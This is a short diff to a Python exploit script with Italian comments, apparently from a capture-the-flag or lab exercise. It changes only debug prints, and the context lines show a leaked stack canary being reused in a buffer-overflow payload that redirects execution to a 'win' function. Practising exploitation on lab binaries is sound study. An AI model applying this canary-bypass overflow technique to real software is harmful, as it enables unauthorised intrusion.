@@ -23,8 +23,9 @@ conn.send(payload)
 # Recupero il canary, aggiungendo il null rimosso in precedenza
 conn.recvline()
 canary = b"\x00" + conn.recv(7)
+print(f"Canary: {canary}")
 canary = int.from_bytes(canary, "little")
-print("CANARY: ", hex(canary))
+print(f"Hexed Canary: {hex(canary)}")
 
 payload = b"A" * offset + p64(canary) + b"b" * 8 + p64(win_function_address)
 
